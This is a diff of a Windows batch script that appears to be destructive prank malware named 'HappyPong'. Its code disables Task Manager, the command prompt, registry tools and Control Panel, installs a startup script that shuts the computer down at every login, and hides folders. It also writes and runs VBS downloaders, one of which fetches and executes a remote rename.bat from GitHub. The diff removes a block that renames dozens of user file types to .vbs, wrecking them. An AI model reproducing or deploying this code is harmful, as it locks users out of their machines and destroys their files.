@@ -13,87 +13,24 @@ reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v Enab
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
 reg ADD "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 2 /f
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f
-goto RenameTheseShits
+goto SayGoodbye
 
-:RenameTheseShits
-ren *.bat *.vbs
-ren *.jpg *.vbs
-ren *.hta *.vbs
-ren *.html *.vbs
-ren *.png *.vbs
-ren *.gif *.vbs
-ren *.ico *.vbs
-ren *.mp3 *.vbs
-ren *.mp4 *.vbs
-ren *.mp2 *.vbs
-ren *.wav *.vbs
-ren *.rar *.vbs
-ren *.docx *.vbs
-ren *.rtf *.vbs
-ren *.lnk *.vbs
-ren *.iso *.vbs
-ren *.torrent *.vbs
-ren *.cmd *.vbs
-ren *.pptx *.vbs
-ren *.7z *.vbs
-ren *.tar *.vbs
-ren *.js *.vbs
-ren *.jar *.vbs
-ren *.json *.vbs
-ren *.log *.vbs
-ren *.pdf *.vbs
-ren *.xls *.vbs
-ren *.jpeg *.vbs
-ren *.vbox *.vbs
-ren *.vmdk *.vbs
-ren *.vmx *.vbs
-ren *. *.vbs
-ren *.webp *.vbs
-ren *.ttf *.vbs
-ren *.sfnt *.vbs
-ren *.swf *.vbs
-ren *.ps1 *.vbs
-ren *.scr *.vbs
-ren *.arj *.vbs
-ren *.ace *.vbs
-ren *.lhz *.vbs
-ren *.doc *.vbs
-ren *.asm *.vbs
-ren *.wp *.vbs
-ren *.mdb *.vbs
-ren *.ppt *.vbs
-ren *.avi *.vbs
-ren *.mpeg *.vbs
-ren *.asf *.vbs
-ren *.rm *.vbs
-ren *.mov *.vbs
-ren *.mp *.vbs
-ren *.mod *.vbs
-ren *.mid *.vbs
-ren *.bmp *.vbs
-ren *.smc *.vbs
-ren *.gb *.vbs
-ren *.gbc *.vbs
-ren *.sb *.vbs
-ren *.sb2 *.vbs
-ren *.sb3 *.vbs
-ren *.gba *.vbs
-ren *.reg *.vbs
-ren *.ini *.vbs
-ren *.db *.vbs
-ren *.xml *.vbs
-ren *.dmp *.vbs
-ren *.ocx *.vbs
-ren *.bin *.vbs
-ren *.dll *.vbs
-ren *.prx *.vbs
-ren *.nls *.vbs
-ren *.sys *.vbs
+:SayGoodbye
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+echo shutdown -s -t 0 >> SHUTDOWN.bat
+echo msg * SHUTDOWN BATTLE STARTING!... FOREVER! >> SHUTDOWN.bat
+attrib +r +h +s C:\Users\%username%\AppData\Roaming\Microsoft\Windows
+goto FixError
+
+:FixError
+cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+ren SHUTDOWN.vbs SHUTDOWN.bat
 goto GoToTheBackrooms
 
 :GoToTheBackrooms
 md C:\WINDOWS\HappyPong
 cd C:\WINDOWS\HappyPong
+attrib +r +h +s C:\WINDOWS\HappyPong
 echo on error resume next >> ieandstuff.vbs
 echo Set WshShell = CreateObject ("wscript.shell") >> ieandstuff.vbs
 echo WshShell.Regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","https://i.imgur.com/DAipxxw.jpeg", "REG_SZ" >> ieandstuff.vbs
@@ -180,10 +117,22 @@ echo   .open >> download4.vbs
 echo   .write xHttp.responseBody >> download4.vbs
 echo   .savetofile "C:\WINDOWS\HappyPong\scp-173.jpg", 2 '//overwrite >> download4.vbs
 echo end with >> download4.vbs
+echo on error resume next >> download5.vbs
+echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP") >> download5.vbs
+echo dim bStrm: Set bStrm = createobject("Adodb.Stream") >> download5.vbs
+echo xHttp.Open "GET", "https://raw.githubusercontent.com/HappyPong666/RENAMEFILEEXTENSIONS/main/rename.bat?token=GHSAT0AAAAAABZWEDOMWTKKUYLDBGP356CSY2SU7OA", False >> download5.vbs
+echo xHttp.Send >> download5.vbs
+echo with bStrm >> download5.vbs
+echo   .type = 1 '//binary >> download5.vbs
+echo   .open >> download5.vbs
+echo   .write xHttp.responseBody >> download5.vbs
+echo   .savetofile "C:\WINDOWS\HappyPong\rename.bat", 2 '//overwrite >> download5.vbs
+echo end with >> download5.vbs
 start download1.vbs
 start download2.vbs
 start download3.vbs
 start download4.vbs
+start download5.vbs
 goto RemoveUrUglyWallpaper
 
 :RemoveUrUglyWallpaper
@@ -309,21 +258,13 @@ echo WshShell.Run "https://i.imgur.com/ilGkG6C.jpeg" >> pong.vbs
 echo WshShell.Run "halloween.vbs"
 echo wscript.sleep 7000 >> pong.vbs
 echo WshShell.Run "https://scratch.mit.edu/projects/742827606/fullscreen" >> pong.vbs
-goto SayGoodbye
-
-:SayGoodbye
-cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-echo shutdown -s -t 0 >> SHUTDOWN.bat
-echo msg * SHUTDOWN BATTLE STARTING!... FOREVER! >> SHUTDOWN.bat
-attrib +r +h +s C:\WINDOWS\HappyPong
-attrib +r +h +s C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SHUTDOWN.bat
+ping -n 30 127.0.0.1>nul
 goto FreeGameDownload
 
 :FreeGameDownload
 cd C:\Users\%username%\Desktop
 echo Set WshShell = CreateObject ("wscript.shell") >> click_this_if_you_accidentally_close_the_browser.vbs
 echo WshShell.Run "https://scratch.mit.edu/projects/742827606/fullscreen" >> click_this_if_you_accidentally_close_the_browser.vbs
-ping -n 30 127.0.0.1>nul
 goto UrMomsEmail
 
 :UrMomsEmail
@@ -429,7 +370,6 @@ reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoS
 reg ADD "HKLM\Software\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown" /v IExplorer /d 0 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoFindFiles /d 1 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Internet Explorer\Restrictions" /v NoNavButtons /d 1 /f
-reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\NonEnum" /v {20D04FE0-3AEA-1069-A2D8-08002B30309D} /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DisableGPO /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
 reg ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 67108863 /f
@@ -535,6 +475,7 @@ cd C:\WINDOWS\HappyPong
 date 6/6/2006
 start change.vbs
 start explorer.exe
+start rename.bat
 start ieandstuff.vbs
 start pong.vbs
 start shutdown.vbs
@@ -560,7 +501,3 @@ reg ADD "HKLM\SYSTEM\CurrentControlSet\Services\NlaSvc\Parameters\Internet" /v E
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuNetworkPlaces /t REG_DWORD /d 1 /f
 reg ADD "HKLM\Software\Policies\Microsoft\Windows\System" /v DontDisplayNetworkSelectionUI /t REG_DWORD /d 1 /f
 reg ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
-goto BlockDeviantArt
-
-:BlockDeviantArt
-echo 127.0.0.1 https://www.deviantart.com >> C:\WINDOWS\System32\drivers\etc\hosts
